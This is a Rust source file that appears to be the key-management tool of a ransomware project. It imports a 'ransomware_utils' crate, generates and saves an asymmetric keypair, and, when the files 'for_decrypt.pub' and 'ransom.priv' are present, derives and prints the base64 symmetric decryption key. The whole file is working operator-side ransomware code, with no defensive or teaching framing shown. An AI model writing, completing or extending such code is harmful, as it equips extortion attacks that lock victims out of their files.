use ransomware_utils::{dump_asym_keys, get_keypair, get_symmetric_key, import_asym_keys};
use base64ct::{Base64, Encoding};
use clap::Parser;
#[derive(Parser, Debug)]
struct Args {
    #[arg(short, long)]
    file_name: Option<String>,
    #[arg(short, long)]
    pub_key_file_name: Option<String>
}

use std::env;
use walkdir::WalkDir;
fn check_dir(file_name: &str) -> bool{

    let current_dir = env::current_dir().expect("Failed to get current directory");

    // Walk through the current directory
    for entry in WalkDir::new(current_dir) {
        match entry {
            Ok(entry) => {
                let metadata = entry.metadata().unwrap();
                if metadata.is_file() && entry.file_name() == file_name{
                    return true;
                }
            },
            Err(e) => println!("Error: {}", e),
        }
    }
    false
}

fn main() {
    let args = Args::parse();

    match &args.file_name {
        Some(keys_file_name) => {
            let (priv_key, pub_key) = get_keypair(None);
            dump_asym_keys(&priv_key, &pub_key, Some(&keys_file_name.as_str()));
        }
        None => (),
    }

    match args.pub_key_file_name {
        Some(file_name) => {
            if file_name == "for_decrypt.pub" && check_dir("for_decrypt.pub") && check_dir("ransom.priv"){
                let priv_key_file = "ransom.priv";
                let pub_key_file = file_name;
                let (priv_key, pub_key) = import_asym_keys(priv_key_file, pub_key_file.as_str());
                let enc_dec_key = get_symmetric_key(&priv_key, &pub_key);
                //Base64 function expected a &[u8] or a slice so this converts it
                let key_array_src: &[u8] = enc_dec_key.as_slice();
                let key_b64_string = Base64::encode_string(key_array_src);

                println!("\nbase64 decrypt key: {}\n", key_b64_string);
            } else {
                println!("Possible Reasons For Failure:\n\tFile name provided was not for_decrypt\
                .pub\n\tProgram could not locate either the for_decrypt.pub or the ransom.priv \
                file\n\t(Please make sure all of these files are inside the cwd)");
            }
        }
        _ => {}
    }
}
